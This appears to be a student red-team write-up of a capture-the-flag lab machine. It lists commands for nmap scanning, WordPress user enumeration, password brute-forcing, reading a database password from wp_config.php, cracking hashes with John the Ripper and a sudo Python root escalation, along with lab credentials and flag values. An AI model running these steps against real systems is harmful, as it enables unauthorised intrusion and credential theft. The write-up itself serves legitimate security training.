# Red Team: Summary of Operations
 
## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation
 
### Exposed Services
 
 
Nmap scan results for each machine reveal the below services and OS details:
 
Command: $ nmap -sV 192.168.1.110
  
  
![redteam1](https://user-images.githubusercontent.com/91024338/143156404-1f4162a4-e0e5-4385-884b-4daf231ff115.JPG)

 
This scan identifies the services below as potential points of entry:
 
- Target 1
 
  - Port 22/TCP Open SSH
  - Port 80/TCP Open HTTP
  - Port 111/TCP Open rcpbind
  - Port 139/TCP Open netbios-ssn 
  - Port 445/TCP Open netbios-ssn
 
The following vulnerabilities were identified on each target:
 
- Target 1

  - Weak user password
  - User enumeration (WordPress site)
  - Unsalted user password hash (WordPress site)
  - Misconfiguration of user privileges and user escalation
 
### Exploitation
 
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
 - Flag1: b9bbcb33ellb80be759c4e844862482d
 - **Exploit Used**
      - Used WPScan to enumerate users of the Target 1 WordPress site
      - Used Brute Force to guess Michael’s password
 - Command:
      - wpscan --url http://192.168.1.110/wordpress/ --enumerate u

![redteam2](https://user-images.githubusercontent.com/91024338/143157109-f730c529-0fa3-4934-8e58-291f6b2721f3.JPG)
![redteam3](https://user-images.githubusercontent.com/91024338/143157142-49c0c5f1-e7e1-4bc6-9784-072e6d685ee6.JPG)
![redteam4](https://user-images.githubusercontent.com/91024338/143157159-d5dc97d7-2bb9-4106-9649-ce2bd54a666b.JPG)
![redteam5](https://user-images.githubusercontent.com/91024338/143157180-25422c20-6bb0-4bdb-8500-d297f4d7c77b.JPG)




      -Password:michael
      - SSH in michael: ssh michael@192.168.1.110
      - cd var/www/html
      - ls -l
      - nano service.html (Flag1 located) 

![redteam6](https://user-images.githubusercontent.com/91024338/143157402-7ddab105-f4dc-48ea-9d14-77bf279cd6b9.JPG)
![redteam7](https://user-images.githubusercontent.com/91024338/143157412-0322b2b3-9699-4138-88ee-9061cc2c84ea.JPG)
![redteam8](https://user-images.githubusercontent.com/91024338/143157425-b9a86fe8-902b-416e-9068-45047c6628fe.JPG)


 
 - Flag2: fc3fd58dcdad9ab23faca6e9a3e581c
 - **Exploit Used**
      - Used WPScan to enumerate users of the Target 1 WordPress site
      - Used password from previous Brute Force
      - Password: michael
 - Command:     
      - ssh michael@192.168.1.110
      - cd var/www
      - ls 
      - cat flag2.txt
            
![redteam9](https://user-images.githubusercontent.com/91024338/143157461-5f80f5d5-3ed2-4d53-9237-b3a63c09179b.JPG)
      
      
- Flag3:afc01ab56b50591e7dccf93122770cd2

**Exploit Used**
     -Same exploits used to gain Flag 1 and 2:
        - Accessing MySQL Database
-Commands
	- cd /var/www/html/wordpress
	- cat wp_config.php
	- mysql -u root -p’R@v3nSecurity’ 
	- show databases;
	- use wordpress;
	- show tables;
	- select * from wp_posts;

![redteam10](https://user-images.githubusercontent.com/91024338/143157686-13ad1e0a-309f-433e-b0fe-e992eedce83a.JPG)
![redteam11](https://user-images.githubusercontent.com/91024338/143157712-ba16df30-7895-4d8c-a329-1f761bba46b2.JPG)
![redteam12](https://user-images.githubusercontent.com/91024338/143157739-a0724fed-e838-45b7-ac73-ededead52c1e.JPG)
![redteam13](https://user-images.githubusercontent.com/91024338/143157753-940e3539-dd53-415b-9027-df1ea24d8cd2.JPG)




 
 
- Flag4:715dea6c055b9fe3337544932f2941ce
-**Exploit used**
     - Used MySQL database to gain access to user credentials.
     - Used John the Ripper to crack the password hash.
     - Used Python to gain root privileges.
     - User credentials are stored in the ‘wp_users table’ in the wordpress database.
     - I copied/saved the usernames and password hashes to my Kali machine in a file named wp_hashes.txt.
-Commands:
	- mysql -u root -p’R@v3nSecurity’ 
	- show databases;
	- use wordpress;
	- show tables;
	- select * from wp_users;

![redteam14](https://user-images.githubusercontent.com/91024338/143157919-218bf1ae-63f2-4b22-80a1-ac2fc98b7226.JPG)

 
-Commands:
	- cd /usr/share/wordlist
	- john --wordlist=rockyou.txt wp_hashes.txt
 
![redteam15](https://user-images.githubusercontent.com/91024338/143158223-3eea04ea-f1bb-4539-ac76-f2fd9583a468.JPG)
![redteam16](https://user-images.githubusercontent.com/91024338/143158252-026f0a7d-8737-418b-af1f-fd98361847e2.JPG)


 
-Results: 
-Steven’s password: pink84
 
- After I cracked Steven’s password I SSH as Steven, checked for root privileges and escalated to root with Python.
-Commands:
	- ssh steven@192.168.1.110
	- password: pink84
	- sudo -l
	- sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
	- cd /root
	- ls
	- cat flag4.txt

![redteam17](https://user-images.githubusercontent.com/91024338/143158406-09a79c6d-99e1-4246-95fa-82b1abd1b3f1.JPG)
![redteam18](https://user-images.githubusercontent.com/91024338/143158420-fe0269f5-e475-41ad-b374-4b1e0d07e08b.JPG)
![redteam19](https://user-images.githubusercontent.com/91024338/143158438-ac7b1fac-acd6-48ea-ac5b-aa9e31184597.JPG)

 

 

